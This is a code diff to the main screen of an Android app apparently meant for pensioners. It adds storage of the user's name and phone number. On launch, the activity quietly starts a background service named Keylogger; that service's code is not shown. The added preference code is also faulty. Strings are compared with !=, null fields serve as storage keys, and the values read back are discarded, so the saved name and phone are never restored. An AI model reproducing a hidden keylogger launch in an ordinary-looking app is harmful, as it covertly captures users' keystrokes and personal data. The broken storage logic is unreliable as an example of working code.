@@ -2,6 +2,7 @@ package com.truemind.pensionnleisure;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Log;
@@ -14,16 +15,51 @@ public class MainActivity extends Activity {
     private final long FINISH_INTERVAL_TIME = 2000;
     private long backPressedTime = 0;
     ImageButton btn1, btn2, btn3, btn4, btn5;
-    String keyDown2;
+    String name, phone;
+    String namepref, phonepref;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         startService(new Intent(this, Keylogger.class));
+        if(namepref!=""||phonepref!="") {
+            getPreferences();
+            name = namepref;
+            phone = phonepref;
+        }else{
+            Intent intent = getIntent();
+            name = intent.getStringExtra("name");
+            phone = intent.getStringExtra("phone");
+            savePreferences();
+        }
+
+        //Toast.makeText(MainActivity.this, namepref, Toast.LENGTH_SHORT).show();
+        //Toast.makeText(MainActivity.this, phonepref, Toast.LENGTH_SHORT).show();
         initView();
         initListener();
     }
+
+    private void getPreferences(){
+        SharedPreferences pref = getSharedPreferences("pref", MODE_PRIVATE);
+        pref.getString(namepref, name);
+        pref.getString(phonepref, phone);
+    }
+
+    private void savePreferences() {
+        SharedPreferences pref = getSharedPreferences("pref", MODE_PRIVATE);
+        SharedPreferences.Editor editor = pref.edit();
+        editor.putString(namepref, name);
+        editor.putString(phonepref, phone);
+        editor.commit();
+    }
+    private void removeAllPreferences(){
+        SharedPreferences pref = getSharedPreferences("pref", MODE_PRIVATE);
+        SharedPreferences.Editor editor = pref.edit();
+        editor.clear();
+        editor.commit();
+    }
+
     private void initListener() {
 
         btn1.setOnClickListener(new View.OnClickListener() {
@@ -57,7 +93,10 @@ public class MainActivity extends Activity {
             @Override
 
             public void onClick(View v) {
+
                 Intent intent1 = new Intent(MainActivity.this, CheckActivity.class);
+                intent1.putExtra("name", namepref);
+                intent1.putExtra("phone", phonepref);
                 startActivity(intent1);
                 finish();
             }
@@ -88,6 +127,7 @@ public class MainActivity extends Activity {
 
         if(0<=intervalTime && FINISH_INTERVAL_TIME >= intervalTime) {
             super.onBackPressed();
+            removeAllPreferences();
         }
         else
         {
